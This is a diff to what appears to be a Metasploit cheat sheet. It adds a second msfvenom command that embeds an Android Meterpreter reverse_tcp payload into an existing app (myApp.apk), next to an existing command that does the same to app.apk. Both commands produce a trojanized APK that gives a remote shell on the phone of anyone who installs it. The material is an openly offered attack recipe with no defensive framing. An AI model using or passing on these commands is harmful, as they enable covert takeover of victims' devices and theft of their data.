@@ -69,6 +69,7 @@ Android Meterpreter reverse Payload
 
 Android Embed Meterpreter Payload
 <pre>$ msfvenom -x app.apk -p android/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -o out.apk </pre>
+<pre>msfvenom --platform android --arch dalvik -x myApp.apk -p android/meterpreter/reverse_tcp LHOST=192.168** LPORT=7777 -o build.apk</pre>
 
 #Save AS explort.rc
 Run command 
